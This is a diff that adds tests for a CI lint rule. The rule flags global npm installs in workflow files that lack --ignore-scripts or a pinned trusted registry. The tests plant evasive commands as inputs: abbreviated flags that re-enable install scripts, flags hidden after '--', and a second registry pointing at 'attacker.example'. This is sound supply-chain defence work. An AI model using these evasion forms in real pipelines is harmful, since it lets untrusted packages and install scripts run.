@@ -679,6 +679,127 @@ describe("a global install names where the package comes from", () => {
     });
   }
 
+  /** Runs the lane over a tree whose workflow carries `command` as one extra step's body. */
+  function runWithPlantedCommand(command: string) {
+    const dir = plantedTree((d) => {
+      editWorkflow(d, firstContext(d).workflow, (text) => {
+        const anchor = "      - name: Run build & pack verification\n";
+        if (!text.includes(anchor)) throw new Error("the build-verify step anchor is stale");
+        return text.replace(
+          anchor,
+          `      - name: Bootstrap something\n        run: ${command}\n` + anchor,
+        );
+      });
+    });
+    try {
+      return runLane(dir);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  }
+
+  const PINNED = "--ignore-scripts --registry https://registry.npmjs.org/";
+
+  for (const [label, command, finding] of [
+    [
+      "an abbreviated --ignore-scripts=false after the full flag",
+      `npm install --global --ignore-scripts --ignore-script=false --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /one --ignore-scripts \(found 2, and npm takes the last/,
+    ],
+    [
+      "an abbreviated --no-ignore-script alone",
+      `npm install --global --no-ignore-script --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /without --ignore-scripts/,
+    ],
+    [
+      "a lone abbreviation --ignore-scr, which stops working in the next npm major",
+      `npm install --global --ignore-scr --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /without --ignore-scripts/,
+    ],
+    [
+      "a lone abbreviation --ignore-s",
+      `npm install --global --ignore-s --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /without --ignore-scripts/,
+    ],
+    [
+      "an abbreviated second --registry naming another host",
+      `npm install --global --ignore-scripts --registry https://registry.npmjs.org/ --regis=https://attacker.example/ corepack@0.35.0`,
+      /one --registry \(found 2, and npm takes the last/,
+    ],
+    [
+      "a lone abbreviated --reg naming the trusted registry",
+      `npm install --global --ignore-scripts --reg https://registry.npmjs.org/ corepack@0.35.0`,
+      /without --registry/,
+    ],
+    [
+      "both flags placed after the argument terminator",
+      `npm i -g -- ${PINNED} corepack@0.35.0`,
+      /without --registry and --ignore-scripts|without --ignore-scripts and --registry/,
+    ],
+    [
+      "--registry placed after the argument terminator",
+      `npm i -g --ignore-scripts -- --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /without --registry/,
+    ],
+    [
+      "--ignore-scripts placed after the argument terminator",
+      `npm i -g --registry https://registry.npmjs.org/ -- --ignore-scripts corepack@0.35.0`,
+      /without --ignore-scripts/,
+    ],
+    [
+      "a shell variable as the --ignore-scripts value",
+      `npm install --global --ignore-scripts=$IGNORE --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "a quoted shell variable as the --ignore-scripts value",
+      `npm install --global --ignore-scripts="$IGNORE" --registry https://registry.npmjs.org/ corepack@0.35.0`,
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "an expression as the --ignore-scripts value",
+      "npm install --global --ignore-scripts=${{ inputs.ignore }} --registry https://registry.npmjs.org/ corepack@0.35.0",
+      /literal --ignore-scripts value/,
+    ],
+    [
+      "a second install on the same line that carries no flags",
+      `npm install --global ${PINNED} corepack@0.35.0 && npm install --global pnpm@10.0.0`,
+      /without --registry and --ignore-scripts|without --ignore-scripts and --registry/,
+    ],
+    [
+      "a first install that carries no flags before a pinned one",
+      `npm install --global pnpm@10.0.0 && npm install --global ${PINNED} corepack@0.35.0`,
+      /without --registry and --ignore-scripts|without --ignore-scripts and --registry/,
+    ],
+  ] as const) {
+    it(`reports a global install that evades the pin check: ${label}`, () => {
+      const run = runWithPlantedCommand(command);
+      expect.soft(run.exitCode, `${label} must exit 1:\n${run.output}`).toBe(1);
+      expect.soft(run.output, "the finding must name the rule").toContain("global-install-pin");
+      expect.soft(run.output, "the finding must name the cause").toMatch(finding);
+    });
+  }
+
+  for (const [label, command] of [
+    [
+      "flags before the argument terminator, with the package after it",
+      `npm i -g ${PINNED} -- corepack@0.35.0`,
+    ],
+    [
+      "two installs on one line that each carry both flags",
+      `npm install --global ${PINNED} corepack@0.35.0 && npm install --global ${PINNED} pnpm@10.0.0`,
+    ],
+    [
+      "a local install beside a pinned global one",
+      `npm install --no-audit && npm install --global ${PINNED} corepack@0.35.0`,
+    ],
+  ] as const) {
+    it(`accepts ${label}`, () => {
+      const run = runWithPlantedCommand(command);
+      expect.soft(run.exitCode, `${label} must not be a finding:\n${run.output}`).toBe(0);
+    });
+  }
+
   it("accepts the trusted registry in either spelling, and a trailing slash either way", () => {
     // The control, in the two forms a shell writer actually uses. A rule accepting only one
     // of `--registry x` and `--registry=x` would be a rule this repository could not carry,
